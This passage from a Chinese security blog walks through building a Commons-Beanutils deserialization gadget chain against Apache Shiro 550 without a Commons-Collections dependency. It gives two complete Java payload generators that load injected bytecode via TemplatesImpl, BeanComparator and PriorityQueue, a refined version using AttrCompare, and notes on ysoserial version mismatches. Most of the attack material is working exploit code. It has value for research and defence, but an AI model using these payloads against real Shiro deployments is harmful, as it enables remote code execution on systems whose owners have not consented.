<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.collection.CompositeCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.omg.SendingContext.RunTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">//cc3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://netcat//Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator&lt;Object, Integer&gt; transformingComparator = <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有一个值得说的点就是57行<code>new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));</code>那里，因为这个是CC3的东西，为什么可以拿来攻击无CC依赖的shiro呢？<br>因为这里我们只是利用<code>TransformingComparator</code>来占位，以便于在<code>priorityQueue.add(templates)</code>的时候不报错。并且我们在反序列之前修改了<code>priorityQueue</code>的<code>comparator</code>。因此序列化的内容不包含CC链的东西，所以可以攻击无CC依赖的shiro。</p>
<h3 id="攻击小插曲："><a href="#攻击小插曲：" class="headerlink" title="攻击小插曲："></a>攻击小插曲：</h3><h4 id="CC依赖问题"><a href="#CC依赖问题" class="headerlink" title="CC依赖问题"></a>CC依赖问题</h4><p>正常来说这里应该是不会攻击成功的，但是不知道为什么我本地好像JDK包里面导入了CC链还是怎么的，这里是攻击成功了。因为这里的CB链子其实还是包含CC依赖的，在哪呢？<br>我们把目光聚焦<code>BeanComparator</code>：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png" alt="image.png"><br>我们利用的是这个构造函数，这个构造函数里的<code>ComparableComparator</code>其实是需要有CC依赖的。因此我们需要利用到另外一个构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property, Comparator comparator )</span> &#123;</span><br><span class="line">        setProperty( property );</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个构造函数需要我们传入一个<code>Comparator</code>，并且这个Comparator还需要满足<code>implements Comparator, Serializable</code>。</p>
<p>快速寻找无疑就是利用Python脚本跑了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">seriable</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;seriable.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">commpotor</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Compotor.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list1 = seriable()</span><br><span class="line">list2 = commpotor()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> list2:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://youngkylin.yuque.com/attachments/yuque/0/2023/txt/28868587/1678504014327-69354a48-1737-4a38-af79-355ffa031449.txt?_lake_card=%7B%22src%22:%22https://youngkylin.yuque.com/attachments/yuque/0/2023/txt/28868587/1678504014327-69354a48-1737-4a38-af79-355ffa031449.txt%22,%22name%22:%22Compotor.txt%22,%22size%22:3539,%22ext%22:%22txt%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22ufa1a6d93-32a4-45e2-ab85-0f1f04e810b%22,%22taskType%22:%22transfer%22,%22type%22:%22text/plain%22,%22mode%22:%22title%22,%22id%22:%22uf0497c8c%22,%22card%22:%22file%22%7D">Compotor.txt</a><a href="https://youngkylin.yuque.com/attachments/yuque/0/2023/txt/28868587/1678504014383-0fc4393f-6ce0-4642-bc3c-39e7c2076b9c.txt?_lake_card=%7B%22src%22:%22https://youngkylin.yuque.com/attachments/yuque/0/2023/txt/28868587/1678504014383-0fc4393f-6ce0-4642-bc3c-39e7c2076b9c.txt%22,%22name%22:%22seriable.txt%22,%22size%22:59753,%22ext%22:%22txt%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u068ef607-840a-41a8-a1b5-a992126f254%22,%22taskType%22:%22transfer%22,%22type%22:%22text/plain%22,%22mode%22:%22title%22,%22id%22:%22u4eb8801b%22,%22card%22:%22file%22%7D">seriable.txt</a><br>结果：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png" alt="image.png"><br>下面还有很多，随便挑一个<br>这里就选第一个了，因为<code>public+jdk自带+无参构造</code><br>完善之后的payload:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.collection.CompositeCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.ComparableComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.omg.SendingContext.RunTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="comment">//cc3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://netcat//Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"></span><br><span class="line">        TransformingComparator&lt;Object, Integer&gt; transformingComparator = <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png" alt="image.png"><br>一样可以弹出计算器</p>
<h4 id="CB版本问题"><a href="#CB版本问题" class="headerlink" title="CB版本问题"></a>CB版本问题</h4><p>如果我们用yso那个工具生成的payload去打这个也会出现问题<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png" alt="image.png"><br>生成ser.bin之后我们攻击之后会报错<br>具体报错原因如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Caused by: java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</span><br></pre></td></tr></table></figure>
<p>报了一个ID不匹配的问题<br>原因是我们本地的shiro版本是1.8.3,而yso工具的shiro版本是1.9.2.因为版本差别比较大，所以攻击失败了</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
</search>
